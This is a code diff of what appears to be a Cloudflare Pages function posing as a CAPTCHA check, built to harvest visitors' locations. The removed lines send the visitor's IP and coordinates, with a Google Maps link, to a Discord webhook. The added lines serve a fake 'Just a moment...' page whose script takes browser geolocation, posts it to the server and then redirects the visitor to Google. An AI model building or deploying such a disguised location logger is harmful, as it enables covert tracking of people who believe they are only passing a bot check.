@@ -2,13 +2,11 @@ export async function onRequestPost({ request, env }) {
   const form = await request.formData();
 
   const token = form.get('cf-turnstile-response');
-  const lat = form.get('lat');
-  const lon = form.get('lon');
   const ip = request.headers.get("cf-connecting-ip");
 
   if (!token) return new Response("Missing CAPTCHA token", { status: 400 });
 
-  // Verify Turnstile
+  // ✅ Verify Turnstile
   const verifyResp = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
     method: 'POST',
     headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
@@ -25,21 +23,33 @@ export async function onRequestPost({ request, env }) {
     return new Response("CAPTCHA verification failed", { status: 403 });
   }
 
-  // Send to Discord
-  const message = {
-    content: `🛂 CAPTCHA Passed:
-**IP:** ${ip}
-**Latitude:** ${lat}
-**Longitude:** ${lon}
-🔗 https://www.google.com/maps?q=${lat},${lon}`
-  };
-
-  await fetch(env.DISCORD_WEBHOOK, {
-    method: 'POST',
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(message)
-  });
-
-  // Redirect to Google
-  return Response.redirect("https://www.google.com", 302);
+  // ✅ CAPTCHA passed — serve page with JS to get location
+  const html = `
+    <!DOCTYPE html>
+    <html>
+    <head><title>Just a moment...</title></head>
+    <body>
+      <script>
+        navigator.geolocation.getCurrentPosition(function(location) {
+          fetch('/geo', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              lat: location.coords.latitude,
+              lon: location.coords.longitude
+            })
+          }).finally(() => {
+            window.location.href = "https://www.google.com";
+          });
+        }, function() {
+          // If denied, just redirect
+          window.location.href = "https://www.google.com";
+        });
+      </script>
+    </body>
+    </html>
+  `;
+  return new Response(html, { headers: { 'Content-Type': 'text/html' } });
 }
